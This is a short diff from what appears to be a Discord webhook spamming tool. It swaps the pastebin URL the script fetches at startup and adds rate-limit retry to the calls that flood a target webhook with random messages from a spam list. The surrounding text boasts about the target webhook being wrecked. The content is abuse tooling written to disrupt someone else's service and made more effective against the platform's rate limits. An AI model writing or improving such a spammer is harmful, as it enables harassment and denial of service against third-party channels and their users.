@@ -7,7 +7,7 @@ from discord_webhook import DiscordWebhook
 
 ##########
 
-speed_coil = requests.get("https://pastebin.com/raw/1CunE69Q").text
+speed_coil = requests.get("https://pastebin.com/raw/Q7j9yEtV").text
 
 ##########
 
@@ -70,9 +70,9 @@ def main():
     print(f"Progress of webhook being fucked: \n[{bar}] {str(percent)}%")
 
     if webhookusername=="":
-        DiscordWebhook(url=[str(targetwebhook)], content=random.choice(spamarray)).execute()
+        DiscordWebhook(url=[str(targetwebhook)], rate_limit_retry=True, content=random.choice(spamarray)).execute()
     else:
-        DiscordWebhook(url=[str(targetwebhook)],username=webhookusername, content=random.choice(spamarray)).execute()
+        DiscordWebhook(url=[str(targetwebhook)], rate_limit_retry=True, username=webhookusername, content=random.choice(spamarray)).execute()
 
 ########## 
 
